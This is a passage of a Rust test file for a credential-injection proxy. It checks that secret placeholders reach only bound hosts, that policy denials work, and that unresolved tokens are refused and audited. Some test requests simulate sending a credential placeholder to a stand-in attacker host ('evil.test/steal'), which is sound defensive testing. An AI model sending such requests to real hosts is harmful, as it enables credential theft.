    s.version = 2;
    assert_eq!(w.proxy.proxy.apply(s).unwrap(), 2);
    let got = w
        .get("api.acme.test", "/", &[("authorization", "SCRIM_ACME_KEY")])
        .await;
    assert_eq!(got.error_code().as_deref(), Some("unbound_destination"));
    assert_eq!(w.proxy.proxy.status().snapshot_version, Some(2));
}

#[tokio::test]
async fn unavailable_value_refuses() {
    let w = world(echo_handler()).await;
    let yaml = format!(
        r"
credentials:
  - name: acme
    reference: env://MISSING
    placeholders: [SCRIM_ACME_KEY]
    binding: {{ hosts: ['api.acme.test:{}'] }}
",
        w.port()
    );
    w.proxy.proxy.apply(snapshot(&yaml, &values())).unwrap();
    let got = w
        .get("api.acme.test", "/", &[("authorization", "SCRIM_ACME_KEY")])
        .await;
    assert_eq!(got.error_code().as_deref(), Some("credential_unavailable"));
    assert!(w.up.seen().is_empty());
}

/// Denies `/v1/deny`, allows the rest, and records what it was asked.
#[derive(Default)]
struct PathPolicy {
    asked: std::sync::Mutex<Vec<(InjectionRequest, Option<ClientInfo>)>>,
}

impl InjectionPolicy for PathPolicy {
    fn decide<'a>(
        &'a self,
        req: &'a InjectionRequest,
        extensions: &'a http::Extensions,
    ) -> std::pin::Pin<Box<dyn std::future::Future<Output = InjectionDecision> + Send + 'a>> {
        self.asked
            .lock()
            .unwrap()
            .push((req.clone(), extensions.get::<ClientInfo>().cloned()));
        Box::pin(async move {
            if req.path == "/v1/deny" {
                InjectionDecision::Deny("rule `no-deny-path`".into())
            } else {
                InjectionDecision::Allow
            }
        })
    }
}

#[tokio::test]
async fn the_injection_policy_decides_per_request_after_the_binding() {
    let w = world(echo_handler()).await;
    let policy = Arc::new(PathPolicy::default());
    let mut snap = snapshot(&config(w.port()), &values());
    snap.injection = Some(policy.clone());
    w.proxy.proxy.apply(snap).unwrap();
    let key = [("authorization", "Bearer SCRIM_ACME_KEY")];

    let got = w.get("api.acme.test", "/v1/deny", &key).await;
    assert_eq!(got.status, StatusCode::FORBIDDEN, "{}", got.text());
    assert_eq!(got.error_code().as_deref(), Some("policy_denied"));
    assert!(got.text().contains("no-deny-path"), "{}", got.text());
    assert!(w.up.seen().is_empty(), "nothing may reach the upstream");
    assert!(w.proxy.audit.events().iter().any(|e| matches!(e,
        AuditEvent::RequestRefused { code: ErrorCode::PolicyDenied, credentials, .. }
            if credentials == &["acme"])));

    let got = w.get("api.acme.test", "/v1/ok", &key).await;
    assert_eq!(got.status, StatusCode::OK, "{}", got.text());
    assert_eq!(
        w.up.seen()[0].headers["authorization"],
        format!("Bearer {ACME_VALUE}").as_str()
    );

    // The policy sees bound requests only, once per credential, with the client attached.
    let got = w.get("evil.test", "/steal", &key).await;
    assert_eq!(got.error_code().as_deref(), Some("unbound_destination"));
    let got = w.get("api.acme.test", "/v1/none", &[]).await;
    assert_eq!(got.status, StatusCode::OK);
    let asked = policy.asked.lock().unwrap().clone();
    assert_eq!(asked.len(), 2);
    let (r, client) = &asked[0];
    assert_eq!(
        (
            r.credential.as_str(),
            r.reference.as_str(),
            r.method.as_str()
        ),
        ("acme", "env://ACME", "GET")
    );
    assert_eq!(r.destination.host, "api.acme.test");
    assert!(
        client
            .as_ref()
            .is_some_and(|c| c.peer.is_some() && c.session.is_none())
    );
    assert_no_values(&w.texts(&got));
}

/// A placeholder-shaped token no credential resolves (a generated placeholder whose value has
/// not loaded, a reference placeholder of an unknown reference) is refused toward a bound host
/// with `credential_unavailable`, audited, and nothing is sent.
#[tokio::test]
async fn unresolved_placeholders_toward_bound_host_are_refused() {
    use base64::Engine as _;
    let w = world(echo_handler()).await;
    let unknown = "\u{27e6}scrim:not-loaded:01a1b2c3d4e5f60718\u{27e7}";
    let pct = unknown
        .replace('\u{27e6}', "%E2%9F%A6")
        .replace('\u{27e7}', "%E2%9F%A7");
    let basic = base64::engine::general_purpose::STANDARD.encode(format!("x:{unknown}"));
    let cases: Vec<(&str, String, Vec<(&str, String)>, Option<String>)> = vec![
        (
            "header",
            "/".into(),
            vec![("x-api-key", unknown.to_owned())],
            None,
        ),
        ("query", format!("/v1/x?key={pct}"), vec![], None),
        (
            "basic",
            "/".into(),
            vec![("authorization", format!("Basic {basic}"))],
            None,
        ),
        (
            "body",
            "/v1/items".into(),
            vec![("content-type", "application/json".into())],
            Some(r#"{"token":"{{scrim:env://NOT_LOADED}}"}"#.into()),
        ),
        (
            "known and unknown",
            "/".into(),
            vec![
                ("authorization", "Bearer SCRIM_ACME_KEY".into()),
                ("x-other", unknown.to_owned()),
            ],
            None,
        ),
    ];
    for (name, path, headers, payload) in cases {
        let method = if payload.is_some() { "POST" } else { "GET" };
        let mut b = req(method, "api.acme.test", w.port(), &path);
        for (k, v) in &headers {
            b = b.header(*k, v.as_str());
        }
        let r = b.body(body(payload.unwrap_or_default())).unwrap();
        let got = w.client.send("api.acme.test", w.port(), r).await.unwrap();
        assert_eq!(
            got.status,
            StatusCode::SERVICE_UNAVAILABLE,
            "{name}: {}",
            got.text()
        );
        assert_eq!(
            got.error_code().as_deref(),
            Some("credential_unavailable"),
            "{name}"
        );
    }
    assert!(w.up.seen().is_empty(), "something reached the bound host");
    let refused = w
        .proxy
        .audit
        .events()
        .iter()
        .filter(|e| {
            matches!(
                e,
                AuditEvent::RequestRefused {
                    code: ErrorCode::CredentialUnavailable,
                    ..
                }
            )
        })
        .count();
    assert_eq!(refused, 5);
    assert_no_values(&w.texts(&w.get("api.acme.test", "/", &[]).await));

    // Text that only looks similar passes, and so does an unknown placeholder toward a host
    // nothing is bound to.
    for v in [
        "scrim is fine",
        "\u{27e6}scrim:acme\u{27e7}",
        "{{scrim:not a ref}}",
        "\u{27e6}scrim:withheld:capture-failed\u{27e7}",
    ] {
        let got = w.get("api.acme.test", "/", &[("x-note", v)]).await;
        assert_eq!(got.status, StatusCode::OK, "{v}: {}", got.text());
    }
    let got = w.get("evil.test", "/", &[("x-api-key", unknown)]).await;
    assert_eq!(got.status, StatusCode::OK, "{}", got.text());
}
